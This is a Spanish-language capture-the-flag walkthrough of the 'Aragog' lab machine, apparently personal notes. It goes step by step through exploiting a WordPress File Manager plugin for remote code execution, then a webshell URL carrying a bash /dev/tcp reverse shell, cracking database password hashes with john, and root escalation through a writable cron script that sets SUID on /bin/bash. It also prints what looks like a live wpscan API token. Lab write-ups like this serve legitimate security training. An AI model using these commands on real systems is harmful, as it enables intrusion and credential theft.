PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

-En el puerto 80 no hay nada relevante

-Hacemos fuzzing y encontramos la ruta /blog con un wordpress 5.0.12

-La web sale rara, como que no cargan bien los elementos de la web. Si hacemos CONTROL + U para inspeccionar el código fuente vemos que está bajo el dns= http://wordpress.aragog.hogwarts

-Lo añadimos al /etc/hosts y ya se ve bien

-Como es un wordpress, vamos a utilizar la herramienta wpscan para enumerar posibles usuarios y plugins vulnerables

-Con el modo de enumeración sencillo no nos reporta ningún plugin:
	wpscan --url http://wordpress.aragog.hogwarts/blog/ -e ap,u
	NO REPORTA NADA!!

-Probamos a enumerar con la API de Wpscan:
	wpscan --url http://wordpress.aragog.hogwarts/blog/ --enumerate vp --api-token 'io7oFnezyQ9QiEi4bVZcbpntkLzEnSVAYRdd70zEEaE'
	NO REPORTA NADA!!

-Para encontrar el plugin vulnerable tenemos 2 opciones:
	1-Forma Automática
		-Aplicamos el parámetro '--plugins-detection aggressive' junto con el API de wpscan para que nos haga una enumeración de plugins más agresiva, cuando lo detecte la API nos dirá que vulnerabilidad tiene el plugin directamente.
			-wpscan --url http://wordpress.aragog.hogwarts/blog/ --enumerate vp --api-token 'io7oFnezyQ9QiEi4bVZcbpntkLzEnSVAYRdd70zEEaE' --plugins-detection aggressive
			-Plugin Found: File Manager 6.0-6.9 - Unauthenticated Arbitrary File Upload leading to RCE
	2-Forma Manual
		-Hacemos Fuzzing con un diccionario de plugins de wordpress en la ruta URL dónde se ubican los plugins:
			-gobuster dir -w plugins.txt -u 192.168.1.134/blog/wp-content/plugins -x .php,.txt -t 50
			-/wp-file-manager 

-Nos descargamos el exploit 'File Manager 6.0-6.9 - Unauthenticated Arbitrary File Upload leading to RCE' con searchsploit

-Tenemos 2 OPCIONES:

1-FORMA MANUAL:
	-Interceptamos la petición en la siguiente ruta:
		-http://192.168.1.134/blog/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php
		-Analizamos el exploit.py: Hay que sustituir los saltos de línea '\n' y los saltos de carro '\r' por saltos de línea reales y saltos de carro reales, ya que esto está pensado para ser ejecutado como un exploit de python, pero nosotros lo vamos a hacer a través de BurpSuite.
			-Metemos el contenido del exploit en 'payload.txt'
			-Sustituimos los '\n' por saltos de línea reales:
				-sed -i 's/\\n/\n/g' payload.txt: Sustituimos el \\n por \n real en todas las coincidencias del archivo payload.txt. Se pone '\\n' (doble contrabarra para escapar la barra y que lo tome literalmente como un \n)
				-sed: Es un editor de texto en línea que permite buscar y reemplazar texto en archivos.
				-i: Aplica la sustitución en el archivo directamente (lo sobreescribe).
				-sed -i 's/\\r/\r/g' payload.txt: Sustituimos los \r por \r real en todas las coincidencias del archivo 'payload.txt'.
			-Borramos todas las '/' que quedan manualmente con nano para que no den problemas.
		

2-FORMA AUTOMÁTICA:
	-Le especificamos la URL y el comando que queremos ejecutar:
		-python3 51224.py http://wordpress.aragog.hogwarts/blog/ id
	-Aparte de ejecutarnos el comando, también ha subido una webshell y la podemos ejecutar desde la siguiente ruta:
		-http://192.168.1.134/blog/wp-content/plugins/wp-file-manager/lib/files/shell.php?cmd=bash -c "bash -i >%26 /dev/tcp/192.168.1.135/1234 0>%261"
		-URL Encode: Convertimos el '&' en %26 para que la URL lo interprete bien.
	-Hemos recibido la reverse shell:
		www-data@Aragog:


## Escalada de Privilegios

-No podemos ejecutar comandos como sudo. Tampoco hay binarios SUID interesantes

-Como es un wordpress, siempre hay una BBDD en el servidor. Tenemos que encontrar el fichero '/wp-config.php' para autenticarnos en mysql con las credenciales.

-La ruta de directorio 'wordpress' no se encuentra en /var/www/html/wordpress, que es donde suele estar. Para saber donde se encuentra vemos el contenido del archivo 'wordpress.conf':
	cat /etc/apache2/sites-enabled/wordpress.conf
	-Contenido: <Directory /usr/share/wordpress>

-Vamos a /usr/share/wordpress y abrimos el fichero 'wp-config.php'. Aquí no se encuentran las credenciales directamente, sin embargo, encontramos la siguiente información:
	define('DEBIAN_FILE', "/etc/wordpress/config-default.php");

-Dentro del fichero 'config-default.php' se encuentran las credenciales de la BBDD:
	cat /etc/wordpress/config-default.php
		define('DB_NAME', 'wordpress');
		define('DB_USER', 'root');
		define('DB_PASSWORD', 'mySecr3tPass');
		define('DB_HOST', 'localhost');

-Nos autenticamos en mysql con las credenciales por localhost:
	mysql -u root -pmySecr3tPass

-Usamos la BBDD de 'wordpress' y listamos los datos de la tabla 'wp_users':
	select * from wp_users;
		hagrid98 : $P$BYdTic1NGSb8hJbpVEMiJaAiNJDHtc.


-Rompemos el hash con john:
	john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
	-Password: password123

-Pivotamos al usuario hagrid98 con la contraseña obtenida:
	su hagrid98
	password: password123
	hagrid98@Aragog:/

-Buscamos archivos y directorios donde el usuario hagrid98 sea el propietario:
	-Se puede hacer de 2 maneras:
		1-find / -group hagrid98 2>/dev/null
		2-find / -user hagrid98 2>/dev/null
	-Encontramos el siguiente script:
		/opt/.backup.sh

-Vemos el contenido de '/opt/.backup.sh'
	-cat /opt/.backup.sh
		#!/bin/bash
		p -r /usr/share/wordpress/wp-content/uploads/ /tmp/tmp_wp_uploads

-Parece ser una tarea cron que copia el contenido del fichero /wp-content/uploads/ en /tmp/tmp_wp_uploads

-Vemos los permisos del directorio /tmp:
	-ls -la /tmp
		drwxrwxrwt  3 root     root

-Por lo tanto es una tarea cron que es ejecutada por el usuario root. Cómo nosotros tenemos permisos de escritura en la tarea cron '/opt/.backup.sh' podemos manipular el archivo para otorgar permisos SUID a la /bin/bash:
	nano /opt/.backup.sh 
		-Introducimos al final del archivo la siguiente linea:
			chmod +s /bin/bash


-Vamos a monitorizar cualquier cambio que se haga en /bin/bash, con el siquiente comando:
	watch -n 1 ls -l /bin/bash


-Finalmente se ejecutó la tarea cron bajo los permisos de root y conseguimos otorgar permisos SUID a la /bin/bash:
	-rwsr-sr-x 1 root root 1168776 Apr 18  2019 /bin/bash

-Escalamos a root spawneando una shell con permisos privilegiados:
	hagrid98@Aragog:/opt$ bash -p
	bash-5.0# whoami
	root
